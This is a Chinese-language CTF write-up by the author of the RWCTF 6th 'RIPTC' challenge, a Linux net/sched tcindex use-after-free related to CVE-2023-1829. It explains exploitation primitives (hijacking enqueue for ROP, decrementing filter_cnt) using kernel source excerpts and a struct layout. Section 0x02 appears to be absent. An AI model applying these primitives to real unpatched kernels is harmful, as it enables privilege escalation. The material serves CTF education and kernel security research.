---
layout: post
title: "RWCTF 6th RIPTC Write-up zh-CN"
---

# 0x00 出题背景

某日瞥见[Breaking the Code - Exploiting and Examining CVE-2023-1829 in cls_tcindex Classifier Vulnerability](https://starlabs.sg/blog/2023/06-breaking-the-code-exploiting-and-examining-cve-2023-1829-in-cls_tcindex-classifier-vulnerability/) 这篇文章，讲述了[CVE-2023-1829](https://nvd.nist.gov/vuln/detail/CVE-2023-1829) 漏洞成因及利用方法，对应的[修复方案](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8c710f75256bb3cf05ac7b1672c82b92c43f3d28)是删除整个`cls_tcindex.c`文件。今年`net/sched`攻击面在`kctf/kernelCTF`上大火，引起了安全社区对linux kernel安全的广泛关注，遂以历史遗迹`tcindex` 为切入点，寻找该文件可能存在的其他安全问题，将这场贴身肉搏的经历献给RWCTF的参赛选手们，望乞海涵。

<!-- more -->

对题目感兴趣想先上手把玩的朋友，可以参考RIPTC的题目[描述](https://github.com/chaitin/Real-World-CTF-6th-Challenges/tree/main/RIPTC)和[附件](https://github.com/chaitin/Real-World-CTF-6th-Challenges/releases/download/x/riptc_attachment_241a4f7b8921b131e3237af987ad4f82.tar.gz)，身临其境体验一番。
# 0x01 漏洞挖掘


关于`.config`文件和运行环境，参考kernelCTF的相关[build](https://github.com/google/security-research/blob/master/kernelctf/build_release.sh)和[本地运行](https://github.com/google/security-research/blob/master/kernelctf/simulator/local_runner.sh)脚本，对于内核的安全机制应开尽开，关闭了`CONFIG_IO_URING`、`CONFIG_NETFILTER`、`CONFIG_NET_CLS_ACT`（间接disable CVE-2023-1829的[原始问题](https://starlabs.sg/blog/2023/06-breaking-the-code-exploiting-and-examining-cve-2023-1829-in-cls_tcindex-classifier-vulnerability/#vulnerability-analysis)）和多余的`CONFIG_NET_CLS_*`，以及[modprobe_path](https://github.com/smallkirby/kernelpwn/blob/master/technique/modprobe_path.md)和[cpu_entry_area](https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-3776_lts/docs/exploit.md#put-payload-in-fixed-kernel-address-cve-2023-0597)的trick。最后因为有部分的tc利用代码可[参考](https://github.com/star-sg/CVE/blob/master/CVE-2023-1829/src/cls.c)，将[nsjail](https://github.com/google/nsjail)的`time_limit`调整为120秒，顺便考验一下大家的编程能力。

# 0x03 利用方案

## primitive

将漏洞场景抽象下，就是可以多次对`drr_class`这个kmalloc-128 object进行UAF。在内核代码上下文中，首先可知有个任意地址call的原语，[`drr_enqueue`](https://elixir.bootlin.com/linux/v6.1.72/source/net/sched/sch_drr.c#L331) -> [`drr_classify`](https://elixir.bootlin.com/linux/v6.1.72/source/net/sched/sch_drr.c#L293) 获取到free后的drr_class对象，即通过`skb->tc_index` 指定对应的res中的class地址：

```c
static int tcindex_classify(struct sk_buff *skb, const struct tcf_proto *tp,
			    struct tcf_result *res)
{
	struct tcindex_data *p = rcu_dereference_bh(tp->root);
	struct tcindex_filter_result *f;
	int key = (skb->tc_index & p->mask) >> p->shift;

	pr_debug("tcindex_classify(skb %p,tp %p,res %p),p %p\n",
		 skb, tp, res, p);

	f = tcindex_lookup(p, key);
	if (!f) {
		struct Qdisc *q = tcf_block_q(tp->chain->block);

		if (!p->fall_through)
			return -1;
		res->classid = TC_H_MAKE(TC_H_MAJ(q->handle), key);
		res->class = 0;
		pr_debug("alg 0x%x\n", res->classid);
		return 0;
	}
	*res = f->res;
	pr_debug("map 0x%x\n", res->classid);

	return tcf_exts_exec(skb, &f->exts, res);
}
```

随后的`qdisc_enqueue` 即会调用`cl->qdisc->enqueue` ，只要`cl`两层引用后的内容可控，就能劫持执行流去做ROP：

```c
static int drr_enqueue(struct sk_buff *skb, struct Qdisc *sch,
		       struct sk_buff **to_free)
{
	unsigned int len = qdisc_pkt_len(skb);
	struct drr_sched *q = qdisc_priv(sch);
	struct drr_class *cl;
	int err = 0;
	bool first;

	cl = drr_classify(skb, sch, &err);
	if (cl == NULL) {
		if (err & __NET_XMIT_BYPASS)
			qdisc_qstats_drop(sch);
		__qdisc_drop(skb, to_free);
		return err;
	}

	first = !cl->qdisc->q.qlen;
	err = qdisc_enqueue(skb, cl->qdisc, to_free);
	if (unlikely(err != NET_XMIT_SUCCESS)) {
		if (net_xmit_drop_count(err)) {
			cl->qstats.drops++;
			qdisc_qstats_drop(sch);
		}
		return err;
	}
```

```c
static inline int qdisc_enqueue(struct sk_buff *skb, struct Qdisc *sch,
				struct sk_buff **to_free)
{
	qdisc_calculate_pkt_len(skb, sch);
	return sch->enqueue(skb, sch, to_free);
}
```

大多数的kernelCTF和TC相关的writeup都没有提及`tcf_unbind_filter`相关的原语，在free掉drr_class对象后，在`sch_drr.c`中基本上找不到直接相关的原语了，还是得和res挂上钩，转到`cls_tcindex.c`中仅有的只是`tcf_unbind_filter` 操作了（有好几条路径可达如delete等）：

```c
static inline void
__tcf_unbind_filter(struct Qdisc *q, struct tcf_result *r)
{
	unsigned long cl;

	if ((cl = __cls_set_class(&r->class, 0)) != 0)
		q->ops->cl_ops->unbind_tcf(q, cl);
}

static inline void
tcf_unbind_filter(struct tcf_proto *tp, struct tcf_result *r)
{
	struct Qdisc *q = tp->chain->block->q;

	if (!q)
		return;
	__tcf_unbind_filter(q, r);
}
```

```c
static void drr_unbind_tcf(struct Qdisc *sch, unsigned long arg)
{
	struct drr_class *cl = (struct drr_class *)arg;

	cl->filter_cnt--;
}
```

在`tcindex_delete` -> `tcf_unbind_filter` -> `drr_unbind_tcf`流转后，偏移24处的filter_cnt会减去1：

```
gef➤  ptype /o struct drr_class
/* offset      |    size */  type = struct drr_class {
/*      0      |      24 */    struct Qdisc_class_common {
/*      0      |       4 */        u32 classid;
/* XXX  4-byte hole      */
/*      8      |      16 */        struct hlist_node {
/*      8      |       8 */            struct hlist_node *next;
/*     16      |       8 */            struct hlist_node **pprev;

                                       /* total size (bytes):   16 */
                                   } hnode;

                                   /* total size (bytes):   24 */
                               } common;
/*     24: 0   |       4 */    unsigned int filter_cnt : 16;
/* XXX  6-byte hole      */
/*     32      |      16 */    struct gnet_stats_basic_sync {
/*     32      |       8 */        u64_stats_t bytes;
/*     40      |       8 */        u64_stats_t packets;
/*     48      |       0 */        struct u64_stats_sync {
                                       <no data fields>

                                       /* total size (bytes):    0 */
                                   } syncp;

                                   /* total size (bytes):   16 */
                               } bstats;
/*     48      |      20 */    struct gnet_stats_queue {
/*     48      |       4 */        __u32 qlen;
/*     52      |       4 */        __u32 backlog;
/*     56      |       4 */        __u32 drops;
/*     60      |       4 */        __u32 requeues;
/*     64      |       4 */        __u32 overlimits;

                                   /* total size (bytes):   20 */
                               } qstats;
/* XXX  4-byte hole      */
/*     72      |       8 */    struct net_rate_estimator *rate_est;
/*     80      |      16 */    struct list_head {
/*     80      |       8 */        struct list_head *next;
/*     88      |       8 */        struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } alist;
/*     96      |       8 */    struct Qdisc *qdisc;
/*    104      |       4 */    u32 quantum;
/*    108      |       4 */    u32 deficit;

                               /* total size (bytes):  112 */
                             }
```

